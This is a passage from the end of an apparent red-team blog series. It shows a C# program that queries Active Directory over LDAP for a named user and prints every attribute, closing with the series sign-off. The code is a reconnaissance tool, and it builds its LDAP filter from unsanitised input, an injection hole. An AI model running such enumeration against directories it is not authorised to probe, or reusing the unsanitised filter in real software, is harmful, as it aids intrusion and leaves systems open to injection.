       
        static void Main(string[] args)
        {
            string user = args[0];
            try
            {
                Domain domain = Domain.GetCurrentDomain();
                

                //Create Ldap connection object
                DirectoryEntry ldapconn = new DirectoryEntry("LDAP://"+domain.Name);
                
                //Create ldap searcher
                DirectorySearcher searcher = new DirectorySearcher(ldapconn);
                //Attach ldapquery filter
                searcher.Filter="(&(objectClass=user)(sAMAccountName="+user+"))";
                //Gets Result
                SearchResult result = searcher.FindOne();
                if (result != null)
                {
                    ResultPropertyCollection fields = result.Properties;
                    foreach(String ldapField in fields.PropertyNames)
                    {
                        foreach(Object myCollection in fields[ldapField])
                        {
                            Console.WriteLine(String.Format("{0,-20} : {1}",
                                ldapField, myCollection.ToString()));
                        }
                    }
                }
                else
                {
                    Console.WriteLine("User Doesn't Exist");
                }

                

                //

            }
            catch (Exception e)
            {
                Console.WriteLine("Problem Connecting {0}", e.Message.ToString());
            }
            


            

            
        }
    }
}

```

Thanks for reading the 7daysofRed series, hopefully you learned something new or refreshed on some old details.More educational and research blog posts coming soon, so stay tuned.



